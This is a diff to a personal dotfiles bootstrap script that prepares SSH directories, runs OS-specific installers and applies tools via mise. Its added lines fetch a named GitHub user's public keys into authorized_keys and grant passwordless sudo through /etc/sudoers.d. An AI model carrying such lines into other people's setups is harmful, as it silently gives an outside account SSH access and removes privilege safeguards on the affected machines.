@@ -4,8 +4,8 @@ set -euo pipefail
 ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 TARGET_DIR="${HOME}/projects/dotfiles"
 
-# 1. Dual-Mode Check: If running standalone (e.g. via curl | bash), clone first
-if [ ! -d "$ROOT_DIR/linux" ] && [ ! -d "$ROOT_DIR/macos" ]; then
+# Check if running standalone (e.g. via curl | bash), clone first
+if [ ! -d "${ROOT_DIR}/linux" ] && [ ! -d "${ROOT_DIR}/macos" ]; then
   echo "[*] Bootstrapping: Creating directory infrastructure..."
   mkdir -p "${HOME}/projects" "${HOME}/.ssh"
   ssh-keyscan github.com >> "${HOME}/.ssh/known_hosts" 2>/dev/null || true
@@ -22,25 +22,35 @@ if [ ! -d "$ROOT_DIR/linux" ] && [ ! -d "$ROOT_DIR/macos" ]; then
 fi
 
 mkdir -p "${HOME}"/{projects,.config,.ssh/config.d}
+chmod 700 "${HOME}/.ssh"
+
+curl -fsSL https://github.com/veerendra2.keys >> "${HOME}/.ssh/authorized_keys"
+if command -v ssh-keyscan >/dev/null 2>&1; then
+  ssh-keyscan github.com gitlab.com >> "${HOME}/.ssh/known_hosts" 2>/dev/null || true
+fi
+chmod 600 "${HOME}/.ssh/authorized_keys"
 
 if [ "$(uname -s)" = "Darwin" ]; then
   echo "[*] Running macOS installation..."
-  "$ROOT_DIR/macos/install.sh"
+  "${ROOT_DIR}/macos/install.sh"
 
 elif [ "$(uname -s)" = "Linux" ]; then
+  echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" | sudo tee "/etc/sudoers.d/custom" >/dev/null
+  sudo chmod 0440 "/etc/sudoers.d/custom"
+
   echo "[*] Running Linux installation..."
-  "$ROOT_DIR/linux/install.sh"
+  "${ROOT_DIR}/linux/install.sh"
 
 else
   echo "Error: Unsupported OS" >&2
   exit 1
 fi
 
-# 4. Configure Dotfiles and Global Tools via Mise
 if command -v mise >/dev/null 2>&1; then
   echo "[*] Applying and installing mise dotfiles/runtimes..."
-  mise trust "$ROOT_DIR/mise.toml"
-  mise dotfiles apply --yes
+  mise settings experimental=true
+  mise -C ${ROOT_DIR} trust --yes "${ROOT_DIR}/mise.toml"
+  mise -C ${ROOT_DIR} dotfiles apply --yes --force
   mise install --global
   echo "[+] All global tools installed successfully!"
 else
